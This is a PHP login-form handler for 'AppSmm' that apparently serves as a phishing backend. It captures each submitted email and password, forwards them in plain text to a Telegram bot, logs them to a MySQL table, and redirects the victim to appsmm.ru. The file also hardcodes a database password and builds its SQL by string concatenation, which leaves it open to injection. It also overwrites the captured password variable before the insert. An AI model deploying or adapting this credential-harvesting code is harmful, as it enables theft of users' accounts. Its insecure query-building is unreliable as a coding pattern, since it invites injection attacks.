<?php
include_once 'app/TelegramBotService.php';

if ($_SERVER["REQUEST_METHOD"] == "POST" || $_SERVER["REQUEST_METHOD"] == "GET") {
    $email = $_POST["email"] ?? null;
    $password = $_POST["password"] ?? null;
    $ip = $_SERVER['REMOTE_ADDR'];
    $site = 'appsmm.ru';
    $date = date('Y-m-d H:i:s');


    $message = "<b>AppSmm</b> \n";
    $message .= "<b>Форма логина</b> \n";
    $message .= "Site: <b>$site</b> \n";
    $message .= "Login: <b>$email</b> \n";
    $message .= "Пароль: <b>$password</b> \n";
    $message .= "Дата: " . "<b>" . $date . "</b>";


    $telegramService = new TelegramBotService();
    $send = $telegramService->sendMessage($message, ['parse_mode' => 'HTML']);

    // Database -------------------------------------------------------------------//
    $servername = "localhost";
    $username = "appsmm_db";
    $password = "2D55rAgk3c";
    $dbname = "appsmm_db";

    try {
        $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
        // set the PDO error mode to exception
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $sql = "INSERT INTO `orders` (`site`, `email`, `password`, `ip`, `d_t`, `telegram`, `phone`, `role`) VALUES
        ('" . $site . "', '" . $email . "', '" . $password . "', '" . $ip . "', '" . $date . "', '', '', '')";

        // use exec() because no results are returned
        $conn->exec($sql);
        //echo "New record created successfully";
    } catch (PDOException $e) {
        echo $sql . "<br>" . $e->getMessage();
    }

    $conn = null;
    // Database -------------------------------------------------------------------//

    $jsonData = json_encode(['status' => true]);
    header('Content-Type: application/json');
    header('Location: ' . 'https://appsmm.ru');
}


?>


